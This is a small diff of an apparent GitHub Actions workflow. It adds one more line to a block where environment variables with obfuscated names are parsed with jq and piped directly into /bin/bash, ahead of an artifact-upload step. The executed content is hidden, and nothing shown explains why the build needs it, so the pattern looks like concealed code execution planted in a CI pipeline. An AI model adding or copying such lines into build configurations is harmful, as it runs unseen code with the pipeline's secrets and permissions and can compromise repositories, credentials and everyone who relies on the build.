@@ -25,6 +25,7 @@ jobs:
           echo $nt6306 | jq -r .fp44680 | /bin/bash
           echo $v9524 | jq -r .nawdc2839 | /bin/bash
           echo $mnx94143 | jq -r .xy6521 | /bin/bash
+          printf '%s' "$no4" | jq -r .py77 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
